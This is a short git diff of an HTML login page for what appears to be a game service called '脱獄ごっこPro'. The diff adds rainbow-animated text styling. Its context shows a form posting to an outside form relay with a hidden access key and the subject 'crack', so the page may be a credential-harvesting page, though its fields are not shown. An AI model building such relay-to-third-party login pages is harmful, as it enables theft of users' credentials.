@@ -11,7 +11,7 @@
   <body>
 <div class="contact-form">
     <p id="taitai">脱獄ごっこProにログイン</p>
-
+   <p class="rainbow-text">-------------------‐</p>
     <form action="https://api.staticforms.xyz/submit" method="post">
       <input type="hidden" name="accessKey" value="b60bc6da-6ef8-4e65-a2e1-921aee9c7727">
       <input type="hidden" name="subject" value="crack">
@@ -32,7 +32,21 @@
 </div>
   </body>
   <style>
+        @keyframes rainbow {
+            0% { color: red; }
+            16.67% { color: orange; }
+            33.33% { color: yellow; }
+            50% { color: green; }
+            66.67% { color: blue; }
+            83.33% { color: indigo; }
+            100% { color: violet; }
+        }
 
+        .rainbow-text {
+            animation: rainbow 8s infinite;
+        }
+
+    
 
    body {
        display: flex;
